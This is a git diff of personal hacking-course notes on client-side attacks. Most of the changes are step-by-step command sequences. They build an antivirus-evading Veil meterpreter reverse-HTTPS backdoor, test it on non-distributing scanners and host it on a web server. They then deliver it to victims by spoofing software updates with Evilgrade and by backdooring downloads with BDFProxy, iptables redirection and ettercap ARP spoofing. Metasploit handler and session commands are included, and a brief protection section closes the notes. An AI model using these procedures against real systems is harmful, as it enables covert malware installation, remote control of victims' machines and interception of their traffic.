@@ -709,7 +709,7 @@ Nexpose is a vulnerability management framework,
   - shoes solutions to fix
   - different level of reports can be generated
 
-
+***
 # Gaining Access - Client Side Attacks
 
 ## Introduction : Client side Attacks
@@ -731,7 +731,7 @@ Nexpose is a vulnerability management framework,
   1. Evasion : generates backdoors
   2. Ordance : Generate Payloads
 2. Run veil-evasion > veil-evasion
-  - (or run *veil* > list > 1) Evasion)
+  - (or run *veil* > list > use 1   --->(Evasion))
 3. Select a backdoor/payload > use [payload number]
   - command to see available payloads > list
 4. Set options > set [option] [value]
@@ -748,8 +748,10 @@ Nexpose is a vulnerability management framework,
 - Example:
 ```
 > Veil
-> list    -------> choose 1
-> list    -------> choose 15 (go/meterpreter/rev_https.py)
+> list  
+> use 1       --------> (Select Evasion)
+> list   
+> use 15        --------> (go/meterpreter/rev_https.py)
 # it will show payload info and options
 # LHOST and LPORT is the ip address and port we'll be listening connection on . i.e. our computer ip
 > set LHOST 10.0.2.14            ---->IP_ADDR_HACKER_MACHINE
@@ -763,7 +765,10 @@ Nexpose is a vulnerability management framework,
 # it will result the back of backdoor file as .exe
 # metasploit RC file can be directly loaded in future for use
 ## you can verify you backdoor's signature if it can bypass anti-virus programs at:
-> scan the file at https://nodistribute.com
+> scan the file at
+    - https://nodistribute.com
+    - https://spyralscanner.net/
+    - https://antiscan.me/
 > or https://zsecurity.org/bypassing-anti-virtus-hacking-windows-10-using-empire/
 # keep veil up to date
 # Start listening to connections before sending backdoor
@@ -787,6 +792,68 @@ $ msfconsole
 > set LHOST 10.0.2.14    
 > set LPORT 8080    ---->(on 80, we'll running our webserver to deliver backdoor)
 > exploit
+##################################################
+> session -l    ---> to see all active sessions
+> session -i 1  ----> select first session
 ```
 
-## Basic Backdoor delivery method : WINDOWS 10
+## Basic Backdoor delivery method : WINDOWS 10 (Just to verify backdoor)
+- copy the .exe file generate using veil
+  - **from** /var/lib/veil-evasion/output/compiled/file_name.exe
+  - **to**  /var/www/html/_create_a_folder_here_/file_name.exe
+    - __created folder name will go in url__
+- start webserver
+  - service apache2 start
+- start **listening to connections** using msfconsole
+- go to url from your target Machine
+  - http://IP_ADDR_HACKER_MACHINE/__FOLDER_NAME_FROM_ABOVE_STEP__/
+- download and execute exe
+
+## Client Side Attacks : Backdoor delivery method 1 - Spoofing Software Updates
+-  Fake an update for an already installed program.
+- Install backdoor instead of the update.
+- Requires DNS spoofing + Evilgrade (a server to serve the update)
+- You need to be MITM
+- when we get a request for an update instead of giving the IP of actual server, we can give the IP of hacker server (which is running a program EvilGrade) and it will tell user that it has an update and server the backdoor
+- steps:
+   1. Download and install Evilgrade using the instructions in the resources.
+   2. Start Evilgrade.                   > ./evilgrade
+   3. Check programs that can be hijacked.   > show modules
+   4. Select one                   > configure [module]
+   5. Check the options that can be set     > show options
+   6. Set backdoor location               > set agent [agent location]  (malware .exe file created by veil)
+   7. you can change the endsite as well, where user will be redirected after update   > set endsite [endsite url]
+   8. Start server                      > start
+   9. Start dns spoofing  (domain for which you want to give the fake update. 'VirtualHost' field in evilgrade option)
+   10. start the handler
+      - metasploit -> msfconsole
+      - use exploit/multi/handler
+      - set PAYLOAD windows/meterpreter/reverse_http    (some problem with https, so use http)
+      - set LPORT and VirtualHost
+      - exploit
+
+## Client Side Attacks : Backdoor delivery method 2 - backdooring exe download
+- Backdoor any exe the target downloads.
+- We need to be in the middle of the connection.
+- Tool : Backdoor Factory Proxy (find installation steps in repository folder : backdoor-factory-proxy)
+> steps:  
+  1. edit bdfproxy config -> leafpad /opt/bdfproxy/bdfproxy.cfg
+    - Set IP address to your IP in config.
+      - look for [[[WindowsIntelx86]]]  and [[[WindowsIntelx64]]]  --> your target Machine
+      - HOST = YOUR_IP_ADDRESS
+    - Change Proxy mode : proxyMode = transparent
+  2. Start bdfproxy. > bdfproxy.py    (program as soon as receive a request it backdoors that program)
+  3. Redirect traffic to bdfproxy.  
+    - iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+  4. Start listening for connections    
+    - msfconsole -r /opt/bdfproxy/bdfproxy_msf_resource.rc
+    - or it may be at path : /usr/share/bdfproxy/bdf_proxy_msf_resource.rc
+  5. Start arp spoofing.  
+    - ettercap -Tq -M arp:remote -i [interface] /[Gatewaay IP]// /Target IP/
+  6. When done reset ip tables rules. > ./flushiptables.sh
+
+## Protection against : Client Side Attacks
+- Ensure you're not being MITMed -> use trusted network, xarp etc
+- Only download from https pages
+- check file MD5 after download:
+  - http://www.winmd5.com/
